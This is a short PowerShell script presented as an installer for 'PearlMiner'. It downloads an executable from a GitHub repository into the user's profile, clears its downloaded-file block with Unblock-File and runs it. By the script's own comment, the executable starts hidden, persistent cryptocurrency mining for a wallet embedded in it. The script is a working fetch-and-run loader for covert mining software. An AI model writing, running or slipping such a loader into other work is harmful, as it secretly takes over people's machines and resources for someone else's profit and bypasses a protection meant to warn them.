# PearlMiner installer: downloads PearlMiner.exe from this repo and runs it.
# Opening the exe starts hidden persistent PRL mining for the embedded wallet (per-user).
$exe = "$env:USERPROFILE\PearlMiner.exe"
Invoke-WebRequest "https://github.com/mrmackkm223-coder/miner/raw/master/PearlMiner.exe" -OutFile $exe
Unblock-File $exe
& $exe
